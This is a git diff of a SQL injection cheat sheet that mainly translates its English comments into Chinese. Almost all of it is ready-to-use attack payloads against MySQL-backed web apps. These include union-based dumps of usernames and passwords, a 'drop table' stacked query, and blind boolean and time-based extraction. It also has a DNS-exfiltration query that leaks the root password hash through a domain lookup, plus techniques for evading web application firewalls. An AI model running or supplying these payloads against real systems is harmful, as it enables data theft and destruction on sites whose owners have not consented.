@@ -1,6 +1,4 @@
 # SQL injection  
-SQL is a famous database engine which is used with web server. In this situation, we can inject some SQL based code to get what we want <3.  
-
 🔔 MySQL
 *  [Basic](#basic-injection)  
 *  [Union based](#union-based)  
@@ -21,41 +19,43 @@ SQL is a famous database engine which is used with web server. In this situation
 
 # Basic injection  
 select password from users where name = '$id';  
-So, what can we insert into $id?  
+參數id可控?  
 ```sql  
 5566 or 1=1 --  
-5566; drop table hello  // execute drop table on second line  
+5566; drop table hello  // 接著執行 drop table  
 
-rafael' or 1=1 --  // select password from users where name = 'rafael' or 1=1 --';  
-rafael' or ''='    // select password from users where name = 'rafael' or ''='';
+1pwnch' or 1=1 --  // select password from users where name = 'rafael' or 1=1 --';  
 
-// bypass length limit
+1pwnch' or name like '1%' --  // name欄位為1開頭的字串 為true
+
+// 超短版本注入
 '||1#     // logic op dont need space char
 '^0#
 '|0#
 ```  
 
 # Union based
-1. Vulnerable to SQL injection?  
-2. union with **same number** of columns  
+1. 存在注入?  
+2. union select **欄位數目** 個資料  
 ```sql
-// N+=1, until page cannot show
+// 確認欄位數目 N
+// N 不斷上加, 直到頁面無法正常顯示
 1' order by N#
 union select 1, 1, 1,....
 ```  
-3. make sure the place where our result will be showed  
-4. make sure for some basic information  
+3. 資料顯示的地方  
+4. 調查身家資訊  
 ```sql
 union select user(),database(),version(), @@version_compile_os--+
 ```  
-5. start our exciting part  
+5. 嘗試show出table中的資料列  
 ```sql
-...union select 1,2,...,group_concat(schema_name) from information_schema.schemata--+  // get all database name
+...union select 1,2,...,group_concat(schema_name) from information_schema.schemata--+  // 全部db name
 ```  
 
 ```sql
 ...union select 1,2,...,group_concat(table_name) from information_schema.tables where table_schema='FUCK'+--+  
-// table_schema can also show with hex
+// table_schema 也可以用hex表示
 ```  
 
 ```sql
@@ -66,34 +66,33 @@ union select user(),database(),version(), @@version_compile_os--+
 ```sql
 1' and 1=2 union 1,2,...,group_concat(username,password) from users+--+  
 // separate
-1' and 1=2 union select 1,group_concat(column_name separator '*') from table_name#    // separate with *
+1' and 1=2 union select 1,group_concat(column_name separator '*') from table_name#    // 分割符
 ```  
 
 # Blind based  
-result is not showed on the page and there is also no any error message.  
+沒有動態結果顯示在頁面上，也沒有sql錯誤顯示時適用。  
 🐶 **Boolean based**  
-**True**: page shows normal.  
-**False**: page shows error or no any result.  
+**True**: 頁面顯示正常  
+**False**: 頁面顯示沒有結果或異常  
+這個東西沒有定論，主要看頁面在什麼樣的情況下做什麼樣的處理來定義。  
 ```sql
 length(str)
-substr(str,pos,len)   // index starts from 1
+substr(str,pos,len)   // index從1開始
+limit 0,1    // index從0開始
 mid(str,pos,len)
-ascii(str)    // we will get decimal, ord()
-if(a,b,c)   // if a is true, it will return b, or otherwise return c
+ascii(str)    // decimal, ord()
+if(a,b,c)   // 若a為true，則回傳b，否則回傳c
 id=1' and ascii(substr((select database()),1,1))>65--+  // ascii from 32~127
-// work with syntax
 and (mid((select group_concat(column_name) from information_schema.columns),1,1) like 'd');
 ```  
-boolean based depends on **whether page show things**...  
 
 🐶 **Time based**  
 ```sql
-id=1' and if(ascii(substr((select database()),1,1)>115),0,sleep(5))--+  // if the first char is not bigger than s, then delay 5s
-```
-Blind-based costs lot of time, so script is necessary for us!  
+id=1' and if(ascii(substr((select database()),1,1)>115),0,sleep(5))--+  // 若第一個字母不是s以後的字母，則延遲五秒
+```  
 
 🐶 **DNS injection**  
-The process of bruteforce still takes much time. If we inject a domain name in our payload to force it to be parsed, we might get our data efficiently from dns log.  
+強制解析域名，然後從 dns log 就可以拿到想要的結果。  
 MySQL:  
 ```php
 select load_file( concat('\\\\', (select password from mysql.user where user='root' limit 1), '.www.example.com\\abc') );
@@ -173,56 +172,55 @@ union select 1,2,3,'b',5,6,7 order by 4 (asc)
 We always use `order by` to get the number of table columns in union-based. However, back to the basic concept of order by, we can use it to do injection just like above. `Order by 4` means order by the 4th column in table, default setting is asc. So, our injection of `b` would become the second result, and data which is before `b` would escalate to first result.  
 
 # WAF bypass
-WAF is a defender for web.  
-Tricks:  
-- Space bypass 
+奇技淫巧:  
+- 空白繞過 
   - `select/**/username/**/from/**/users;`  
   - `union select 1,2` -> `union(select(1),2)`  
   - aspx+mssql `%00`, php+mysql `/*%00*/`
-- Obfuscation with Upper Lowercase  
+- 大小寫混淆  
   - `SelecT`  
-- Obfuscation with wrap  
+- 混淆  
   - `UNIunionON`  
-- Inline comments(**It is useful to bypass waf in realworld**)  
+- Inline comments(**非常實用，不一定要前面的版本號**)  
   - `id=1'/*!50000union*/+/*!50000all*/+/*!50000select*/1,2,concat_ws('/',table_name),4+from+/*!50000information_schema.tables*/+/*!50000where*/+table_schema='table'%23`  
-- Comma bypass  
+- 逗號繞過  
   - `union select 1,2,3` -> `union select * from ((select 1)a join (select 2)b join (select 3)c);`  
-  - in use of limit `limit 1 offset 1`  
-  - in use of `mid()`,`substr()`,`substring` we all can use `mid((version())from(1)for(1))`  
-- Encoding(or double) bypass  
+  - limit `limit 1 offset 1`  
+  - 一些函式如 `mid()`,`substr()`,`substring` 可以用括號 `mid((version())from(1)for(1))`  
+- 編碼（或雙編碼）繞過  
   - `URL-ENCODE, HEXIDECIMAL, UNICODE`  
   - `unicode(quote): %u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27 %c0%a7 %e0%80%a7`  
   - `unicode(space): %u0020 %uff00 %c0%20 %c0%a0 %e0%80%a0`  
   - `unicode(left bracket): %u0028 %uff08 %c0%28 %c0%a8 %e0%80%a8`  
   - `unicode(right bracket): %u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9`  
   - `Char(49)` `Hex('a')` `Unhex(61)`  
-  - On asp+iis, server can parse the unicode automatically, `%` in url would be ignored, it means `s%u0065lect` would be parsed as 'select'  
-  - `IBM037`,`IBM500`,`IBM1026`,`cp875` and so on  
+  - 在 asp+iis 的環境下，伺服器常常會自動解析unicode，url中的`%`會被忽略，這也代表`s%u0065lect`能被成功解釋成'select'  
+  - `IBM037`,`IBM500`,`IBM1026`,`cp875` 等等  
      [Request encoding to bypass web application firewalls](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/request-encoding-to-bypass-web-application-firewalls/)  
      [Rare ASP.NET request validation bypass using request encoding](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/september/rare-aspnet-request-validation-bypass-using-request-encoding/)  
 
-- Comment 
+- 注釋 
   - `#`    
   - `--+` `--` `-- -`  
-  - `/* ... */` `///**/`(multiple lines)  
-  - `;` stacking queries cannot be used in mysql query+php, but it works in PDO  
-- Command bypass  
+  - `/* ... */` `///**/`(多行)  
+  - `;` stacking queries 反而只能在PDO中運行  
+- 命令繞過  
   - `sleep()` -> `benchmark()`  
-- Wide-Character injection  
-  - bypass single quote： `%bf%27 %df%27 %aa%27`  
-- keyword `information_schema` bypass  
-  - get database name：`select * from users where name = helloworld();`  
+- 寬字節注入  
+  - 繞過單引號： `%bf%27 %df%27 %aa%27`  
+- 關鍵字 `information_schema` 繞過  
+  - error-based：`select * from users where name = helloworld();`  
     `ERROR 1305 (42000): FUNCTION CODINGGROUND.helloworld does not exist`  
   - `mysql.innodb_table_stats`  
   - `sys.statement_analysis`  
-- HPP on asp  
-  - When GET/POST/COOKIE submit `uid` at the same time, server would follow the order of GET/POST/COOKIE to receive and split them with comma  
+- HPP （asp）  
+  - 當 GET/POST/COOKIE 同時提交 `uid`，伺服器會按照 GET/POST/COOKIE 的順序去接收並且用逗號將他們隔開  
   - Exploit: `http://example.com/?uid=1 and 1=2 union/*  POST: uid=*/select.....`  
-- Function separator  
-  - In fact, there can be something between function name and the left bracket, this can be used to bypass regex  
+- 函式分隔符  
+  - 函式名和左括號間可以插入些字符，下面的例子可以拿來繞過一些禁用函式  
   - function `/**/`,`%2520`,`%250c`,`%25a0` ()  
 
-More：  
+參考與更多：  
 [seebug我的wafbypass之道](https://paper.seebug.org/218/)  
 
 # Webshell
